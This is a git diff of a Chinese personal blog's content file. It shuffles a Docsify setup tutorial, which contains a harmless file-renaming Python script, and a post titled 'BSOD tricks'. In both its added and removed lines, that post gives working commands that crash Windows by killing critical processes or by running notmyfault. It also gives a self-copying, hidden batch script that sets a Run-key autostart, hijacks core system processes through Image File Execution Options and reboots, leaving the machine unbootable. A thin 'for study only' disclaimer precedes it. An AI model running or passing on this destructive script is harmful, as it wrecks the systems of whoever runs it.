<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/search.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-cpp.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-bash.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-python.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--&lt;script src=&quot;https://unpkg.com/docsify-pagination@2.10.1/src/index.js&quot;&gt;&lt;/script&gt;--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify-copy-code/3.0.0/docsify-copy-code.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//unpkg.com/docsify-count/dist/countable.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">onUpdated</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Prism</span>.<span class="title function_">highlightAll</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Prism</span>.<span class="title function_">highlightAll</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>还要在博客目录下创建 <code>_coverpage.md</code>、<code>_navbar.md</code>、<code>_sidebar.md</code> 等等。</p>
-<h1 id="困难-3上传到-github"><a class="markdownIt-Anchor" href="#困难-3上传到-github"></a> 困难 3：上传到 Github</h1>
-<p>我以前一直习惯于手动在 Github 上传文件，每次网页端最多可以上传 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>20</mn></mrow><annotation encoding="application/x-tex">20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span></span></span></span> 个。太少了！<br />
-但是我不会用 <code>git</code>。于是就探索 Git GUI。<br />
-这里不再赘述。</p>
-<ol>
-<li><a href="https://blog.csdn.net/mo_sss/article/details/123274512?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=Git%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0%20gitee&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduweb~default-0-123274512.nonecase">《通过GIT将本地项目上传到gitee》</a></li>
-<li><a href="https://blog.csdn.net/m0_67596612/article/details/124865748?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171368688816800185816542%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171368688816800185816542&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-124865748-null-null.nonecase&amp;utm_term=GIT%20GUI&amp;spm=1018.2226.3001.4450">《Git Gui》</a></li>
-</ol>
-<hr />
-<p>就这样啦，拜拜！~</p>
+<h1 id="蓝屏的方法"><a class="markdownIt-Anchor" href="#蓝屏的方法"></a> 蓝屏的方法</h1>
+<p>如果你想要制作一个可以导致蓝屏的程序，不妨试试以下几种办法。这些办法有的不会对系统造成伤害，有的则可能导致系统无法开机。建议您在备份好数据的情况下再继续作死。</p>
+<blockquote>
+<p><strong>文章中所提的内容仅供学术交流和参考，请勿用于非法用途或欺骗他人。不当使用导致的不良后果与原作者无关。</strong><br />
+另外，本文中的命令行都是通过 <a href="https://bat-to-exe-converter-x64.en.softonic.com/"><code>Bat_To_Exe_Converter</code></a> 转化为 <code>.exe</code> 可执行程序的，所以自启动等项目可能会失效。</p>
+</blockquote>
+<h2 id="结束系统关键进程critical-process-died"><a class="markdownIt-Anchor" href="#结束系统关键进程critical-process-died"></a> 结束系统关键进程（<code>CRITICAL PROCESS DIED</code>）</h2>
+<p>对系统无害，在 <code>Windows XP</code> 以上才有用（<code>XP</code> 会关机）。<br />
+可以直接结束关键的 <code>Windows NT</code> 进程，例如 <code>wininit.exe</code>、<code>smss.exe</code>、<code>csrss.exe</code> 等；也可以直接结束全部进程。<br />
+以下命令，任选其一都可以导致蓝屏。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">taskkill /im wininit.exe /f</span><br><span class="line">taskkill /im svchost.exe /f</span><br><span class="line">taskkill /fi <span class="string">&quot;pid ne 1&quot;</span> /f</span><br><span class="line">cmd /c <span class="keyword">for</span> /f %I <span class="keyword">in</span> (<span class="string">&#x27;wmic process get Name&#x27;</span>)<span class="keyword">do</span> (wmic <span class="keyword">process</span> <span class="built_in">where</span> Name=<span class="string">&quot;%I&quot;</span> delete)</span><br></pre></td></tr></table></figure>
+<p>对于 <code>Windows 10</code> 及以上，也可以使用 <code>PowerShell</code> 直接访问 <code>wininit.exe</code>，造成电脑蓝屏！<br />
+具体地，打开 <code>PowerShell</code> 后直接输入 <code>wininit</code> 即可。</p>
+<h2 id="使用-notmyfault驱动文件-notmyfaultsys"><a class="markdownIt-Anchor" href="#使用-notmyfault驱动文件-notmyfaultsys"></a> 使用 <code>notmyfault</code>（驱动文件 <code>notmyfault.sys</code>）</h2>
+<p>对 <code>Windows XP</code> 以上才有用，<code>Windows XP x64</code> 有可能可以。<br />
+需要用到第三方软件，来源于 <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite"><code>Microsoft Sysinternals Suite</code></a> 中的 <code>notmyfault</code> 系列。<br />
+<img src="/post-images/1688275281498.png" alt="" /></p>
+<p>我们只用到 <code>notmyfaultc</code> 和 <code>notmyfaultc64</code>，这是命令行版本的；其他那两个是 <code>GUI</code> 版。<br />
+具体的命令：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">if</span> %PROCESSOR_ARCHITECTURE%==AMD64 (</span><br><span class="line">notmyfaultc64.exe /accepteula</span><br><span class="line">notmyfaultc64.exe /crash <span class="number">0</span>x03</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">notmyfaultc.exe /accepteula</span><br><span class="line">notmyfaultc.exe /crash <span class="number">0</span>x03</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>首先要确定系统的位数，再调用蓝屏。<br />
+第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 行和第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span> 行可以改变，是根据想要的蓝屏类型确定的；也可以挂起进程。<br />
+使用说明如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NotMyFault is a tool used in the Windows Internals books to show how common device driver bugs affect a system.</span><br><span class="line">This is the console version of NotMyFault.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    notmyfaultc.exe [/wait] /crash crash_type_num</span><br><span class="line"></span><br><span class="line">    crash type:</span><br><span class="line">      0x01: High IRQL fault (Kernel-mode)</span><br><span class="line">      0x02: Buffer overflow</span><br><span class="line">      0x03: Code overwrite</span><br><span class="line">      0x04: Stack trash</span><br><span class="line">      0x05: High IRQL fault (User-mode)</span><br><span class="line">      0x06: Stack overflow</span><br><span class="line">      0x07: Hardcoded breakpoint</span><br><span class="line">      0x08: Double Free</span><br><span class="line">    wait:</span><br><span class="line">      wait until named event NOTMYFAULT is set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /hang hang_type_num</span><br><span class="line"></span><br><span class="line">    hang type:</span><br><span class="line">      0x01: Hang with IRP</span><br><span class="line">      0x02: Hang with DPC</span><br><span class="line">      0x03: Deadlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /leak leak_type_num [/rate KB/s] [/duration seconds]</span><br><span class="line"></span><br><span class="line">    leak type:</span><br><span class="line">      0x01: Paged Leak</span><br><span class="line">      0x02: Nonpaged Leak</span><br><span class="line">    rate:</span><br><span class="line">      default value is 1000 KB/s</span><br><span class="line">      append &#x27;m&#x27; for megabytes, &#x27;g&#x27; for gigabytes or &#x27;t&#x27; for terabytes    duration:</span><br><span class="line">      default value is 30s</span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe bugcheck id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /getdumptype</span><br><span class="line">    notmyfaultc.exe setdumptype [full|kernel]</span><br></pre></td></tr></table></figure>
+<h2 id="删除或劫持内核关键程序0xc000021a"><a class="markdownIt-Anchor" href="#删除或劫持内核关键程序0xc000021a"></a> 删除或劫持内核关键程序（<code>0xc000021a</code>）</h2>
+<p>前面两种方法，重启后即可恢复（除非设置了自启动），那么下面就介绍两种较难修复的。</p>
+<p>删除关键程序，需要到 <code>PE</code> 中去提取或恢复。因为是系统文件，所以一般的用户无法修改，提权过程也相对复杂，推荐使用 <a href="https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"><code>NSudo</code></a> 工具，命令行版可以轻松删除系统文件。</p>
+<p>关于劫持，可以在注册表中进行调整，通过命令行的方式写入注册表（附赠一只自启动）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy %0 v.exe</span><br><span class="line">attrib +s +h /s /d v.exe</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Run&quot; /f /v &quot;vvvvv&quot; /t REG_SZ /d &quot;%cd%\v.exe&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\spoolsv.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">shutdown /r /t 0</span><br></pre></td></tr></table></figure>
+<p>不同于一般的自启动，由于内核关键进程在进入桌面之前就已经启动，所以在锁屏页面前就会蓝屏；安全模式同样。在 <code>Windows XP</code> 中表现为黑屏，只有鼠标可以移动。<br />
+修复方法，就是进入 <code>PE</code> 系统删除映像劫持项目和自启动项目，删除释放的文件等。</p>
+<h2 id="假蓝屏"><a class="markdownIt-Anchor" href="#假蓝屏"></a> 假蓝屏</h2>
+<p>网上各种各样的批处理假蓝屏烂大街了，有一个真实一点的工具叫 <a href="https://github.com/FlyTechVideos/BluescreenSimulator/releases"><code>BluescreenSimulator</code></a>，可以通过命令行调用。<br />
+因为有点儿跑题，这里不再赘述。</p>
 ]]></content>
       <categories>
         <category>计算机</category>
@@ -1376,47 +1365,58 @@
       </tags>
   </entry>
   <entry>
-    <title>BSOD 的技巧（如何使 Windows 蓝屏）</title>
-    <url>/2023/07/02/%E5%BF%AB%E9%80%9F%E8%AE%A9%E7%94%B5%E8%84%91%E8%93%9D%E5%B1%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>电脑蓝屏，又叫蓝屏死机（<code>Blue Screen of Death</code>，简称 <code>BSOD</code>），是微软的 <code>Windows</code> 系列操作系统在无法从一个系统错误中恢复过来时，为保护电脑数据文件不被破坏而强制显示的屏幕图像。<br />
-<code>Windows</code> 操作系统的蓝屏死机提示已经成为标志性的画面。大部分是系统崩溃的现象。<code>Windows</code> 中有两个蓝底白字图像都被称为蓝屏死机：一种是 <code>Windows 9x</code> 操作系统发生小故障，一种是 <code>Windows NT</code> 发生内核错误。由于 <code>Windows 9x</code> 已退出历史舞台，所以现在一般指后者。<br />
-——百度百科</p>
-</blockquote>
-<h1 id="蓝屏的方法"><a class="markdownIt-Anchor" href="#蓝屏的方法"></a> 蓝屏的方法</h1>
-<p>如果你想要制作一个可以导致蓝屏的程序，不妨试试以下几种办法。这些办法有的不会对系统造成伤害，有的则可能导致系统无法开机。建议您在备份好数据的情况下再继续作死。</p>
+    <title>在线文档 Docsify 的简单应用</title>
+    <url>/2024/04/21/zai-xian-wen-dang-docsify-de-jian-dan-ying-yong/</url>
+    <content><![CDATA[<p>众所周知，我把以前我在 CSDN 的博客放在了一个新站点上——CSDN Blog，作为我技术博客的一个分站。</p>
+<p><img src="/post-images/b6eb7142da85747ced076b972ab01c25.png" alt="" /><br />
+<img src="/post-images/b848cc4ed1f610e8281f4667e45b238d.png" alt="" /></p>
 <blockquote>
-<p><strong>文章中所提的内容仅供学术交流和参考，请勿用于非法用途或欺骗他人。不当使用导致的不良后果与原作者无关。</strong><br />
-另外，本文中的命令行都是通过 <a href="https://bat-to-exe-converter-x64.en.softonic.com/"><code>Bat_To_Exe_Converter</code></a> 转化为 <code>.exe</code> 可执行程序的，所以自启动等项目可能会失效。</p>
+<p>链接：<br />
+<a href="https://daoxi365.github.io/csdn-blogs/">https://daoxi365.github.io/csdn-blogs/</a>（新：CSDN Blog）<br />
+<a href="https://pandaoxi.blog.csdn.net/">https://pandaoxi.blog.csdn.net/</a>（已注销的 CSDN 旧博客）</p>
 </blockquote>
-<h2 id="结束系统关键进程critical-process-died"><a class="markdownIt-Anchor" href="#结束系统关键进程critical-process-died"></a> 结束系统关键进程（<code>CRITICAL PROCESS DIED</code>）</h2>
-<p>对系统无害，在 <code>Windows XP</code> 以上才有用（<code>XP</code> 会关机）。<br />
-可以直接结束关键的 <code>Windows NT</code> 进程，例如 <code>wininit.exe</code>、<code>smss.exe</code>、<code>csrss.exe</code> 等；也可以直接结束全部进程。<br />
-以下命令，任选其一都可以导致蓝屏。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">taskkill /im wininit.exe /f</span><br><span class="line">taskkill /im svchost.exe /f</span><br><span class="line">taskkill /fi <span class="string">&quot;pid ne 1&quot;</span> /f</span><br><span class="line">cmd /c <span class="keyword">for</span> /f %I <span class="keyword">in</span> (<span class="string">&#x27;wmic process get Name&#x27;</span>)<span class="keyword">do</span> (wmic <span class="keyword">process</span> <span class="built_in">where</span> Name=<span class="string">&quot;%I&quot;</span> delete)</span><br></pre></td></tr></table></figure>
-<p>对于 <code>Windows 10</code> 及以上，也可以使用 <code>PowerShell</code> 直接访问 <code>wininit.exe</code>，造成电脑蓝屏！<br />
-具体地，打开 <code>PowerShell</code> 后直接输入 <code>wininit</code> 即可。</p>
-<h2 id="使用-notmyfault驱动文件-notmyfaultsys"><a class="markdownIt-Anchor" href="#使用-notmyfault驱动文件-notmyfaultsys"></a> 使用 <code>notmyfault</code>（驱动文件 <code>notmyfault.sys</code>）</h2>
-<p>对 <code>Windows XP</code> 以上才有用，<code>Windows XP x64</code> 有可能可以。<br />
-需要用到第三方软件，来源于 <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite"><code>Microsoft Sysinternals Suite</code></a> 中的 <code>notmyfault</code> 系列。<br />
-<img src="/post-images/1688275281498.png" alt="" /></p>
-<p>我们只用到 <code>notmyfaultc</code> 和 <code>notmyfaultc64</code>，这是命令行版本的；其他那两个是 <code>GUI</code> 版。<br />
-具体的命令：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">if</span> %PROCESSOR_ARCHITECTURE%==AMD64 (</span><br><span class="line">notmyfaultc64.exe /accepteula</span><br><span class="line">notmyfaultc64.exe /crash <span class="number">0</span>x03</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">notmyfaultc.exe /accepteula</span><br><span class="line">notmyfaultc.exe /crash <span class="number">0</span>x03</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<p>首先要确定系统的位数，再调用蓝屏。<br />
-第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 行和第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span> 行可以改变，是根据想要的蓝屏类型确定的；也可以挂起进程。<br />
-使用说明如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NotMyFault is a tool used in the Windows Internals books to show how common device driver bugs affect a system.</span><br><span class="line">This is the console version of NotMyFault.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    notmyfaultc.exe [/wait] /crash crash_type_num</span><br><span class="line"></span><br><span class="line">    crash type:</span><br><span class="line">      0x01: High IRQL fault (Kernel-mode)</span><br><span class="line">      0x02: Buffer overflow</span><br><span class="line">      0x03: Code overwrite</span><br><span class="line">      0x04: Stack trash</span><br><span class="line">      0x05: High IRQL fault (User-mode)</span><br><span class="line">      0x06: Stack overflow</span><br><span class="line">      0x07: Hardcoded breakpoint</span><br><span class="line">      0x08: Double Free</span><br><span class="line">    wait:</span><br><span class="line">      wait until named event NOTMYFAULT is set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /hang hang_type_num</span><br><span class="line"></span><br><span class="line">    hang type:</span><br><span class="line">      0x01: Hang with IRP</span><br><span class="line">      0x02: Hang with DPC</span><br><span class="line">      0x03: Deadlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /leak leak_type_num [/rate KB/s] [/duration seconds]</span><br><span class="line"></span><br><span class="line">    leak type:</span><br><span class="line">      0x01: Paged Leak</span><br><span class="line">      0x02: Nonpaged Leak</span><br><span class="line">    rate:</span><br><span class="line">      default value is 1000 KB/s</span><br><span class="line">      append &#x27;m&#x27; for megabytes, &#x27;g&#x27; for gigabytes or &#x27;t&#x27; for terabytes    duration:</span><br><span class="line">      default value is 30s</span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe bugcheck id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /getdumptype</span><br><span class="line">    notmyfaultc.exe setdumptype [full|kernel]</span><br></pre></td></tr></table></figure>
-<h2 id="删除或劫持内核关键程序0xc000021a"><a class="markdownIt-Anchor" href="#删除或劫持内核关键程序0xc000021a"></a> 删除或劫持内核关键程序（<code>0xc000021a</code>）</h2>
-<p>前面两种方法，重启后即可恢复（除非设置了自启动），那么下面就介绍两种较难修复的。</p>
-<p>删除关键程序，需要到 <code>PE</code> 中去提取或恢复。因为是系统文件，所以一般的用户无法修改，提权过程也相对复杂，推荐使用 <a href="https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"><code>NSudo</code></a> 工具，命令行版可以轻松删除系统文件。</p>
-<p>关于劫持，可以在注册表中进行调整，通过命令行的方式写入注册表（附赠一只自启动）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy %0 v.exe</span><br><span class="line">attrib +s +h /s /d v.exe</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Run&quot; /f /v &quot;vvvvv&quot; /t REG_SZ /d &quot;%cd%\v.exe&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\spoolsv.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">shutdown /r /t 0</span><br></pre></td></tr></table></figure>
-<p>不同于一般的自启动，由于内核关键进程在进入桌面之前就已经启动，所以在锁屏页面前就会蓝屏；安全模式同样。在 <code>Windows XP</code> 中表现为黑屏，只有鼠标可以移动。<br />
-修复方法，就是进入 <code>PE</code> 系统删除映像劫持项目和自启动项目，删除释放的文件等。</p>
-<h2 id="假蓝屏"><a class="markdownIt-Anchor" href="#假蓝屏"></a> 假蓝屏</h2>
-<p>网上各种各样的批处理假蓝屏烂大街了，有一个真实一点的工具叫 <a href="https://github.com/FlyTechVideos/BluescreenSimulator/releases"><code>BluescreenSimulator</code></a>，可以通过命令行调用。<br />
-因为有点儿跑题，这里不再赘述。</p>
+<p>为什么不直接把文章放在 Gridea 下呢？原因有两个：</p>
+<ul>
+<li>文章数量太多，不易操作；</li>
+<li>文章太多时 Gitee Page 会崩掉。</li>
+</ul>
+<p>因此我选择了 <a href="https://docsify.js.org/#/zh-cn/"><strong>Docsify</strong></a> 这一静态文档网站生成器。<br />
+如果你问我，它好用吗？<br />
+——好用是挺好用的，但是很麻烦。</p>
+<p></p>
+<hr />
+<h1 id="概况"><a class="markdownIt-Anchor" href="#概况"></a> 概况</h1>
+<p>在注销之前，我共有 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>420</mn></mrow><annotation encoding="application/x-tex">420</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">2</span><span class="mord">0</span></span></span></span> 篇原创文章需要收集起来放到新网站里。<br />
+通过一些手段导出来之后（<a href="https://blog.csdn.net/qq_33417321/article/details/131342634">手段</a>）解压出来是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>420</mn></mrow><annotation encoding="application/x-tex">420</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">2</span><span class="mord">0</span></span></span></span> 个 Markdown 文件。<br />
+本来 Docsify 是支持 markdown 的，但是 CSDN 的图片有防盗链设置，而且一些文件名也存在问题，不支持。比如说有一些文章标题里带空格，这是不被 Docsify 识别的。<br />
+因此我们需要克服很多困难……</p>
+<h1 id="困难-1文件名称和图片修改"><a class="markdownIt-Anchor" href="#困难-1文件名称和图片修改"></a> 困难 1：文件名称和图片修改</h1>
+<p>由于文章太多，不能一个个地把图片弄下来，也不能手动修改每一个错误的文件名。<br />
+所以我使用了 Python 做批处理的活。这个 Python 文件的目的有以下几个：</p>
+<ul>
+<li>匹配图片，替换图片；</li>
+<li>修改文件名。</li>
+</ul>
+<p>Luckily，我发现一个可以反防盗链的 API。只需要在链接前面添加上 <code>https://pic.2ge.org/cdn/?url=</code> 即可。</p>
+<p>关于匹配，我直接让 ChatGPT 写了一个，真是太有实力啦！👍</p>
+<p><img src="/post-images/4e492b1dc1df1ddffc69326396d3e2dc.png" alt="" /></p>
+<p>我把这些博客放在文件夹 <code>./1</code> 下，在上层目录添加文件夹 <code>./2</code>，创建 <code>./maker.py</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_image_links_from_markdown</span>(<span class="params">markdown_text</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;!\[.*?\]\((.*?)\)&#x27;</span></span><br><span class="line">    image_links = re.findall(pattern, markdown_text)</span><br><span class="line">    <span class="keyword">return</span> image_links</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pths = []</span><br><span class="line">names = []</span><br><span class="line"><span class="keyword">for</span> i, j, k <span class="keyword">in</span> os.walk(<span class="string">&quot;1/&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(names):</span><br><span class="line">        names = k</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> k:</span><br><span class="line">        pths.append(os.path.join(i, l))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pths)):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    names[i] = names[i].split(<span class="string">&quot;.md&quot;</span>)[<span class="number">0</span>].replace(<span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pths[i], <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        r = f.read()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> extract_image_links_from_markdown(r):</span><br><span class="line">        r = r.replace(j, <span class="string">&quot;https://pic.2ge.org/cdn/?url=%s&quot;</span> % j)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2/%s.md&quot;</span> % names[i], <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r)</span><br><span class="line">    <span class="built_in">print</span>(i, names[i])</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">x = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> names:</span><br><span class="line">    j = i</span><br><span class="line">    x += <span class="string">&quot;- [%s](%s)\n&quot;</span> % (j, j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2/_sidebar.md&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>
+<p>把 <code>./2</code> 的所有文件复制到新博客下就行啦。</p>
+<h1 id="困难-2docsify-美化"><a class="markdownIt-Anchor" href="#困难-2docsify-美化"></a> 困难 2：Docsify 美化</h1>
+<p>按照官网教程一步步操作后发现页面好丑……于是我自己参照网络教程，简单地美化了一下：</p>
